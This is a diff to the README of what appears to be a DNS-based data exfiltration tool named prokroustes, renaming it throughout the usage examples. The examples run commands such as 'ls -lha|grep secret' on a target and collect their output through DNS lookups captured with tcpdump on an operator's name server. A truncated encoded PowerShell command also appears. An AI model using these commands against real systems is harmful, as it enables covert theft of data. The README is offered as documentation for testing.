@@ -28,7 +28,7 @@ powershell -enc UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAkACgAIgB7ADAAfQAuAHsA
 ## Usage
 1. Local testing for bash:
 ```bash
-./prokroustis_chunked.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
+./prokroustes_chunked.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
 ```
 
 Contents of local_bash.sh:
@@ -36,7 +36,7 @@ Contents of local_bash.sh:
 
 2. Local testing for powershell with WSL2:
 ```bash
-stdbuf -oL tcpdump --immediate -l -i any udp port 53|./prokroustis_chunked.sh -w ps -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher_examples/local_powershell_wsl2.sh -- 'gci | % {$_.Name}'
+stdbuf -oL tcpdump --immediate -l -i any udp port 53|./prokroustes_chunked.sh -w ps -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher_examples/local_powershell_wsl2.sh -- 'gci | % {$_.Name}'
 ```
 
 Contents of local_powershell_wsl2.sh:
@@ -44,7 +44,7 @@ Contents of local_powershell_wsl2.sh:
 
 3. powershell example where we ssh into our NS to get the incoming DNS requests.
 ```bash
-./prokroustis_chunked.sh -w ps -h yourdns.ns -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
+./prokroustes_chunked.sh -w ps -h yourdns.ns -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
 ```
 
 Contents of dispatcher.sh
@@ -52,19 +52,19 @@ Contents of dispatcher.sh
 
 4. More information on the options
 ```bash
-./prokroustis_chunked.sh --help
+./prokroustes_chunked.sh --help
 ```
 
 ### Comparison
 
-|                       | prokroustis_chunked                | prokroustis_full  |
+|                       | prokroustes_chunked                | prokroustis_full  |
 | -------------         |:-------------:               |:-----:         |
 | payload size overhead (sh/powershell) | 160\*NLABELS/500\*NLABELS                      | 315/740        |
 | dispatcher calls #     | #output/(LABEL_SIZE*NLABELS)[1] |   1👌          |
 | speed (sh/powershell)                | ✔/✔                         |  ✔/😔         |
 
-[1] On prokroustis_chunked, the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise) or is time/resource intensive. 
+[1] On prokroustes_chunked, the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise) or is time/resource intensive. 
 A workaround to avoid running into issues for the aforementioned cases is to first store the command output into a file (e.g. /tmp/file) and then read that file.
 
 ### Todos
- - prokroustis_full's powershell command can use some parallelization
+ - prokroustes_full's powershell command can use some parallelization
